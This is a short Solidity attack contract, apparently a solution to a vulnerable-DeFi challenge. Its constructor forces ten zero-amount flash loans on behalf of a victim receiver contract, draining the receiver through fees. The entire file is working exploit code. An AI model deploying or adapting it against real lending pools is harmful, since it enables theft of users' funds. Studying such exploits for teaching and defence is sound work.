// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title AttackerContract
 * @author Juan Farber (github.com/Farber98)
 */
contract AttackerContract {
    constructor(address _poolAddress, address _vulnerableSc) {
        for (uint8 i = 0; i < 10; i++) {
            _poolAddress.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _vulnerableSc,
                    0
                )
            );
        }
    }
}
